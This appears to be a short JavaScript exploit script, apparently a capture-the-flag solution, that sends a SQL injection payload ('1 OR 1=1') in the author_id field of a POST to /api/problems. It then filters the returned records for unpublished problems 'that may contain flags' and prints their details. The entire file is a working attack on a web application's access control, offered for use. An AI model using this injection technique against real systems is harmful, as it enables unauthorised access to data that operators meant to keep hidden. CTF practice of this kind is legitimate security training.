function getCsrfToken() {
  const metaTag = document.querySelector('meta[name="csrf-token"]');
  return metaTag ? metaTag.getAttribute('content') : '';
}

async function fetchProblemsWithSqlInjection() {
  const formData = new FormData();

  formData.append('author_id', '1 OR 1=1');
  
  try {
    const response = await fetch('/api/problems', {
      method: 'POST',
      body: formData,
      credentials: 'same-origin'
    });
    
    if (!response.ok) {
      throw new Error(`Error: ${response.status} ${response.statusText}`);
    }
    
    const problems = await response.json();
    
    console.log('Found total problems:', problems.length);
    console.log('Unpublished problems that may contain flags:');
    
    const unpublishedProblems = problems.filter(problem => problem.is_published == 0);
    
    unpublishedProblems.forEach(problem => {
      console.log(`
        Title: ${problem.title}
        Description: ${problem.description}
        Difficulty: ${problem.difficulty}
        Author ID: ${problem.author_id}
        ---------------------------`
        );
    });
    
    return problems;
    
  } catch (error) {
    console.error('Failed to fetch problems:', error);
    return null;
  }
}

fetchProblemsWithSqlInjection();